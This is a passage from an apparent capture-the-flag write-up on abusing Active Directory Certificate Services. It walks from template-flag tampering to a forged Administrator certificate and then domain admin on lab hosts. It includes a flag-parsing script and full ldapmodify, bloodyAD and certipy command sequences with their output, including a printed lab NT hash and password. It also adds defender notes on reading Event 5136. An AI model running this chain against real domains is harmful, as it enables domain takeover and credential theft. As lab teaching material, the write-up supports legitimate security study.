        name_m = re.search(r"(?:name|cn):\s*(.+)", block, re.IGNORECASE)
        flag_m = re.search(r"msPKI-Certificate-Name-Flag:\s*(-?\d+)", block, re.IGNORECASE)

        if name_m and flag_m:
            name = name_m.group(1).strip()
            raw_val = int(flag_m.group(1))
            # Convert signed 32-bit integer to unsigned hex representation
            unsigned_val = raw_val & 0xFFFFFFFF
            hex_str = f"0x{unsigned_val:08x}"

            # Check for Enrollee Supplies Subject flag (0x1) or custom combinations
            is_abusable = bool(unsigned_val & 0x1)
            status = "[!] ESC1 VULN" if is_abusable else "[+] Secure"

            hits.append({
                "name": name,
                "raw": raw_val,
                "hex": hex_str,
                "status": status
            })

    if not hits:
        print("[-] No template name flags found in input.")
        return

    print(f"{'Template Name':<30} | {'Decimal Value':<15} | {'Hex Bitmask':<12} | {'Status':<15}")
    print("-" * 80)
    for h in hits:
        print(f"{h['name']:<30} | {str(h['raw']):<15} | {h['hex']:<12} | {h['status']:<15}")

if __name__ == "__main__":
    parse_templates()
```

(The parser checks bit 0 only — extend the mask to `0x10009` to also catch SAN-supply-only and old-cert-renewal templates. On this box's data the table comes out identical either way.)

### State 1 — Baseline (before any writes)

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc1.ping.htb -Y GSSAPI -N \
    -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    '(objectClass=pKICertificateTemplate)' \
    msPKI-Certificate-Name-Flag displayName | \
python3 adcs-mask-parser.py

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
Template Name                  | Decimal Value   | Hex Bitmask  | Status
--------------------------------------------------------------------------------
User                           | -1509949440     | 0xa6000000   | [+] Secure
User Signature Only            | -1509949440     | 0xa6000000   | [+] Secure
Smartcard User                 | -1509949440     | 0xa6000000   | [+] Secure
Authenticated Session          | -2113929216     | 0x82000000   | [+] Secure
Smartcard Logon                | -2113929216     | 0x82000000   | [+] Secure
Basic EFS                      | -2113929216     | 0x82000000   | [+] Secure
Administrator                  | -1509949440     | 0xa6000000   | [+] Secure
EFS Recovery Agent             | -2113929216     | 0x82000000   | [+] Secure
Code Signing                   | -2113929216     | 0x82000000   | [+] Secure
Trust List Signing             | -2113929216     | 0x82000000   | [+] Secure
Enrollment Agent               | -2113929216     | 0x82000000   | [+] Secure
Exchange Enrollment Agent (Offline request) | 1               | 0x00000001   | [!] ESC1 VULN
Enrollment Agent (Computer)    | 402653184       | 0x18000000   | [+] Secure
Computer                       | 402653184       | 0x18000000   | [+] Secure
Domain Controller              | 419430400       | 0x19000000   | [+] Secure
Web Server                     | 1               | 0x00000001   | [!] ESC1 VULN
Root Certification Authority   | 1               | 0x00000001   | [!] ESC1 VULN
Subordinate Certification Authority | 1               | 0x00000001   | [!] ESC1 VULN
IPSec                          | 402653184       | 0x18000000   | [+] Secure
IPSec (Offline request)        | 1               | 0x00000001   | [!] ESC1 VULN
Router (Offline request)       | 1               | 0x00000001   | [!] ESC1 VULN
CEP Encryption                 | 1               | 0x00000001   | [!] ESC1 VULN
Exchange User                  | 1               | 0x00000001   | [!] ESC1 VULN
Exchange Signature Only        | 1               | 0x00000001   | [!] ESC1 VULN
Cross Certification Authority  | 1               | 0x00000001   | [!] ESC1 VULN
CA Exchange                    | 1               | 0x00000001   | [!] ESC1 VULN
Key Recovery Agent             | -2113929216     | 0x82000000   | [+] Secure
Domain Controller Authentication | 134217728       | 0x08000000   | [+] Secure
Directory Email Replication    | 150994944       | 0x09000000   | [+] Secure
Workstation Authentication     | 134217728       | 0x08000000   | [+] Secure
RAS and IAS Server             | 1207959552      | 0x48000000   | [+] Secure
OCSP Response Signing          | 402653184       | 0x18000000   | [+] Secure
Kerberos Authentication        | 138412032       | 0x08400000   | [+] Secure
Temporary WinRM                | -2113929216     | 0x82000000   | [+] Secure
Smartcard Authentication       | -1577058304     | 0xa2000000   | [+] Secure
```

`SmartcardAuthentication` sits at `0xa2000000` — the three require-bits, no supply bits. Eleven other templates light up `[!] ESC1 VULN`, but those ship from Microsoft with `ENROLLEE_SUPPLIES_SUBJECT = true` baked in — out-of-box defaults, not our attack. (Certipy applies enrollment and EKU filters on top of the supply-bit check, which is why its census named only ESC4 and ESC13 instead of twelve templates.) The target is the one writable template with the safe shape.

> **Note:** Several built-in Microsoft templates (`CA Exchange`, `Web Server`, `Root Certification Authority`, etc.) appear as `[!] ESC1 VULN` because they have `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set by design. The supply bit alone isn't the whole ESC1 story — enrollment rights, EKUs, and manager approval all matter, which is why certipy's census of this box (which checks those) named only ESC4 and ESC13. The parser above checks only the name-flag; always verify `msPKI-Enrollment-Flag` (no manager approval required?) and enrollment rights (low-priv principal can enroll?) before acting on any hit.

### State 2 — The Classic Way: OR Write

`2717908993` — the unsigned `0xa2000001`, computed above in the OPSEC section. Bit 0 OR'd in, nothing else touched:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapmodify -H ldap://dc1.ping.htb -Y GSSAPI -N << 'EOF'
dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
changetype: modify
replace: msPKI-Certificate-Name-Flag
msPKI-Certificate-Name-Flag: 2717908993
EOF

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"
```

Verify with the single-DN read:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc1.ping.htb -Y GSSAPI -N \
    -b 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    msPKI-Certificate-Name-Flag

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services
 ,CN=Services,CN=Configuration,DC=ping,DC=htb
msPKI-Certificate-Name-Flag: -1577058303
```

`-1577058303` — the same number with exactly one bit toggled. The bulk scan agrees:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc1.ping.htb -Y GSSAPI -N \
    -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    '(objectClass=pKICertificateTemplate)' \
    msPKI-Certificate-Name-Flag displayName | \
python3 adcs-mask-parser.py

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
```

```
[...35 rows, same as State 1 except:]
Smartcard Authentication       | -1577058303     | 0xa2000001   | [!] ESC1 VULN
```

ESC4 executed. The template now has a supply bit *and* keeps all three require-bits. Compare that to what the Quick CTF Dirty Way does, below.

> **Note:** The preserved require-bits don't prevent the identity forge — once bit 0 is set, the CA takes the CSR as-is. Their value is operational: the template's original behaviour survives intact and restoring to baseline is one write back. The OR write isn't "safer for the victim" — it's "cleaner for the operator and auditor."

### What Certipy Sees — Seat-Dependent

Certipy's vulnerability list depends on who runs it. With write granted to a specific seat, the same census that showed only ESC13 now names the template:

```zsh
➜ bloodyAD -d ping.htb --host dc1.ping.htb -u r.martinelli -k ccache=r.martinelli.ccache \
    add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    'c.roberts'

[+] c.roberts has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb

➜ env KRB5CCNAME=c.roberts.ccache \
certipy find -target dc1.ping.htb -u 'c.roberts@ping.htb' -k -no-pass -stdout

...[snip]...
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
                                          PING.HTB\C.Roberts
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
                                          PING.HTB\C.Roberts
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
                                          PING.HTB\C.Roberts
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\C.Roberts
    [+] User ACL Principals             : PING.HTB\C.Roberts
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
```

Certipy finally sees it: ESC1 and ESC4, from a seat with write. But look at the Enrollment Rights — **Domain Admins and Enterprise Admins only**. Even with the supply bit set, no low-privileged principal can ask for a cert. The flag flip was necessary; it was not sufficient.

### Opening the Door — Enrollment

For the real run the grant goes to `S-1-5-11` — Authenticated Users — instead of a single user:

```zsh
➜ bloodyAD -d ping.htb --host dc1.ping.htb \
    -u r.martinelli -k ccache=r.martinelli.ccache \
    add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    'S-1-5-11'

[+] S-1-5-11 has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
```

`S-1-5-11` is Authenticated Users — every authenticated principal in PING can now enroll. GenericAll is the sledgehammer version of this ACE; a targeted Enroll grant to one controlled principal is the quieter one.

### The Two-Principal Relay

The enrollment has to come from a PING principal, not the PONG foothold. `certipy req` would have to cross the same realm hop that broke `certipy find` — Impacket's cross-realm limitation applies to every certipy subcommand, write side and enroll side alike (the `KDC_ERR_WRONG_REALM` proof is further down). So the PING low-priv seat `c.roberts` picks up the baton:

```zsh
➜ getTGT.py 'PING.HTB/c.roberts:AssumedBreach123'
```

Two principals, one exploit: PONG writes the template, PING enrolls from it.

### The Forge — Administrator's Cert

```zsh
➜ env KRB5CCNAME='c.roberts.ccache' \
certipy req -k -no-pass \
    -target dc1.ping.htb \
    -dc-host dc1.ping.htb \
    -dc-ip $target_dc01_ip \
    -ca ping-DC1-CA \
    -template SmartcardAuthentication \
    -upn 'Administrator@ping.htb' \
    -sid 'S-1-5-21-750635624-2058721901-1932338391-500'

[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Request ID 19. The CA signed a certificate for a user it believes is Administrator — because the CSR said so, and bit 0 makes the CSR the authority. `-upn` puts the Administrator UPN in the SAN; `-sid` burns the Administrator SID into the cert as the `tag:microsoft.com,2022-09-14` explicit-mapping URL. That SID makes the PKINIT mapping unambiguous — the KDC doesn't have to guess which account this cert belongs to; the cert says it.

### PKINIT — The Throne

```zsh
➜ certipy auth \
    -pfx administrator.pfx \
    -username Administrator \
    -domain ping.htb \
    -dc-ip $target_dc01_ip

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@ping.htb'
[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Using principal: 'administrator@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
```

PKINIT accepts the cert because the template carries the Client Authentication EKU. TGT granted, NT hash extracted (redacted — the box is still active on HTB). Note the SAN: only `Administrator@ping.htb`, no second UPN. The preserved require-bits didn't inject the requester's identity into the forged cert; the CA took the CSR as-is.

```zsh
➜ env KRB5CCNAME='administrator.ccache' \
evil_winrmexec -k dc1.ping.htb -dc-ip $target_dc01_ip

...[snip]...

PS C:\Users\Administrator\Documents> whoami; hostname
ping\administrator
dc1
```

`ping\administrator` on `dc1`. Throne.

### State 3 — Restore

The box ends where it started. `2717908992` is the baseline `0xa2000000`:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapmodify -H ldap://dc1.ping.htb -Y GSSAPI -N << 'EOF'
dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
changetype: modify
replace: msPKI-Certificate-Name-Flag
msPKI-Certificate-Name-Flag: 2717908992
EOF

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"
```

```
[...35 rows, same as State 1 except:]
Smartcard Authentication       | -1577058304     | 0xa2000000   | [+] Secure
```

Back to `0xa2000000`, identical to State 1. One bit flipped for the attack, one bit flipped back — the 5136 in the audit log is a single-bit delta in both directions.

The numbers follow the session order — the restore above ran before this comparison test, and the dirty write below was the last write of the session:

### State 4 — The Dirty Way: Overwrite

The one-liner everyone copies:

```zsh
➜ bloodyAD -d ping.htb --host dc1.ping.htb \
    -u r.martinelli -k ccache=r.martinelli.ccache \
    set object 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    msPKI-Certificate-Name-Flag -v 1

[+] CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb's msPKI-Certificate-Name-Flag has been updated
```

```
[...35 rows, same as State 1 except:]
Smartcard Authentication       | 1               | 0x00000001   | [!] ESC1 VULN
```

Same `[!] ESC1 VULN` in the table as the OR write. But the bitmask is `0x00000001` now — the UPN-require guard, the email-require, the directory-path require, all wiped. The bulk scan can't tell the two states apart; only the hex can. The ESC1 condition is identical either way — the difference is what the template looks like *after* you've finished. (State 4 above was verified at the bitmask level; the full request ➜ PKINIT run was done on State 2.)

### Side-by-side: what the writes actually did to the bitmask

| Step | Bitmask (hex) | Bitmask (dec signed) | Require-bits preserved? | Anti-Certifried UPN guard? |
|---|---|---|---|---|
| State 1 — baseline | `0xa2000000` | `-1577058304` | (yes) | (yes) |
| State 2 — OR write (`2717908993`) | `0xa2000001` | `-1577058303` | **yes** | **yes** |
| State 3 — restore | `0xa2000000` | `-1577058304` | (yes) | (yes) |
| State 4 — dirty write (`1`) | `0x00000001` | `1` | **no** (all wiped) | **no** (removed) |

## The Cross-Forest Wall — The Write Side

The write side of the chain, automated, hits the same Impacket limitation that broke enumeration. With the same `r.martinelli.ccache` ticket, `certipy template` against `dc1.ping.htb` dies before it can touch anything:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
certipy template -k -no-pass \
    -target dc1.ping.htb \
    -dc-ip $target_dc01_ip \
    -template SmartcardAuthentication \
    -write-default-configuration

[-] Kerberos error: Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use) (Error code: 68)
```

`KDC_ERR_WRONG_REALM` — error code 68. Certipy is built on Impacket, and Impacket's Kerberos implementation struggles natively with cross-realm TGS referrals. When certipy asks for a service ticket to `ldap/dc1.ping.htb` using the PONG ticket, it gets confused about which realm's KDC is authoritative, and throws. The `ldapmodify -Y GSSAPI` write that did the real work goes through the system's native `libkrb5` instead — the same C library every production MIT-Kerberos client uses — which resolves the referral transparently, hopping from the PONG KDC to the PING KDC and back with the service ticket.

If you want certipy's `-write-default-configuration` behaviour (the noisy ESC1 overwrite) across this boundary, you have to fall back to the manual tools. Which is exactly what the chain above did.

## The Wrapper vs. The Protocol

Certipy and bloodyAD are masterpieces — in a flat, single-domain CTF they compress hours of LDAP plumbing into a 30-second command, and this post couldn't have been written without them. But they're built for speed, and a two-forest box with enforced signing is where speed stops matching the network. This box broke three of their assumptions live: the cross-realm TGS hop Impacket can't make (`KDC_ERR_WRONG_REALM`), the unsigned bind the DC refuses (`strongerAuthRequired`), and the zero-result census — which wasn't a broken tool, just a tool answering a question about the wrong forest. A tool can be perfectly right and still answer the wrong question.

None of that is criticism — every assumption holds in the environment the tools were written for. It's just the difference between a wrapper and a protocol. The wrapper assumes; the protocol asks. When the assumption breaks, ask the protocol yourself.

## When the Quick & Dirty CTF Way Works — Single-Domain CTFs

The classic form is the only option in cross-forest enterprises. In a single-domain CTF (no trusts, no FSPs, no enhanced LDAP signing), the quick & dirty way works fine and is significantly faster — `certipy template -write-default-configuration` is one command versus the three-step read-OR-write-restore flow above.

When the lab is flat, the quick & dirty way is the right call. Westbridge University — the HackSmarter range (pro-lab) — single domain, `westbridge.hsm`, CA on the DC. But check the baseline first — this time it's a blank bitmask:

```zsh
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u a.owen -p 'SecretMyth123!' \
    get object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    --attr msPKI-Certificate-Name-Flag

distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm
msPKI-Certificate-Name-Flag: 0
```

`0` — a blank bitmask. No supply bits, no require bits; the template shipped empty. That's what makes the quick-and-dirty write below harmless here: there were no guardrails to wipe. The same one-liner on PingPong's `0xa2000000` baseline would have flattened three. Same command, different baselines, different damage. And since this is a flat lab — no cross-realm hop to make, no signing wall to hit — the whole chain below runs through certipy alone. The wrapper works here because its assumptions hold here.

```zsh
# Read baseline:
➜ certipy find \
    -u 'a.owen@westbridge.hsm' -p 'SecretMyth123!' -dc-ip 10.0.10.5 \
    -vulnerable -stdout

...[snip]...
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.

# Write the ESC1-enabling flag:
➜ certipy template \
    -target dc.westbridge.hsm -dc-ip 10.0.10.5 \
    -u a.owen@westbridge.hsm -p 'SecretMyth123!' \
    -template SmartCardAuthentication -write-default-configuration

...[snip]...
[*] Successfully updated 'SmartCardAuthentication'

# Re-check after the write:
➜ certipy find \
    -u 'a.owen@westbridge.hsm' -p 'SecretMyth123!' -dc-ip 10.0.10.5 \
    -vulnerable -stdout

...[snip]...
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.

# Enroll:
➜ certipy req \
    -target dc.westbridge.hsm -dc-ip 10.0.10.5 \
    -u 'a.owen@westbridge.hsm' -p 'SecretMyth123!' \
    -ca CA01-AD-CA \
    -template SmartCardAuthentication \
    -upn administrator@westbridge.hsm \
    -sid S-1-5-21-1978613116-3728955385-531918137-500

...[snip]...
[*] Wrote certificate and private key to 'administrator.pfx'

# PKINIT:
➜ certipy auth \
    -pfx administrator.pfx -dc-ip 10.0.10.5

...[snip]...
[*] Got hash for 'administrator@westbridge.hsm': aad3b435b51404eeaad3b435b51404ee:23f398d3fa12625a1dab8a2c19cdd96b
```

Same chain, five commands, no cross-realm Kerberos, no FSPs, no enhanced LDAP signing. None of the failure modes that broke the PingPong certipy calls apply. **It's a real distinction, not a stylistic preference** — the tool's failure mode is *predictable from the topology* of the target, not the skill of the operator. (The Westbridge writeup is still cooking — once it's out, [the full run](https://secretmyth.blog/hacksmarter/hsm-westbridge-university-range/) will live there.)

## Closing — Read The Bits, Not The Integer

When auditing an AD CS template, the integer value of `msPKI-Certificate-Name-Flag` is a red herring. The decimal `-1509949440`, the unsigned `2785017856`, and the hex `0xa6000000` describe the *same* template; only the bit-decode distinguishes a safe template from an ESC1. The cheat-sheet approach of grep'ing for `== 1` or `== 65536` misses every template that combines a supply bit with one or more require bits — and that's the majority of real-world vulnerable templates, not the minority.

The bulk-scan tables in the walkthrough above show *exactly* why this matters. State 2 (OR write) and State 4 (dirty write) are *visually identical* in the table — both flag `Smartcard Authentication` as `[!] ESC1 VULN`. The only way to tell them apart is to read the bitmask itself. The quick-and-dirty way leaves the template with `0x00000001` (no require-bits); the classic way leaves it with `0xa2000001` (require-bits preserved, anti-Certifried guard intact). Same forged cert, same Administrator NT hash — different residual state. Which one you reach for depends on the situation, not on the skill of the person running it.

And the defender has the same decision in reverse. Both writes generate the same Event 5136 — but the before/after values tell two different stories: `0xa2000000 ➜ 0xa2000001` is a one-bit delta, a change meant to be undone; `0xa2000000 ➜ 0x00000001` is a demolition. If you only alert on "the attribute changed," you can't tell them apart. Read the values, not the event.

If you take one thing from this post: **decode the bits, never compare the integer.** A 13-line Python function beats a 5-row cheat sheet every time, and the spec has been the source of truth for two of them already. 🔥
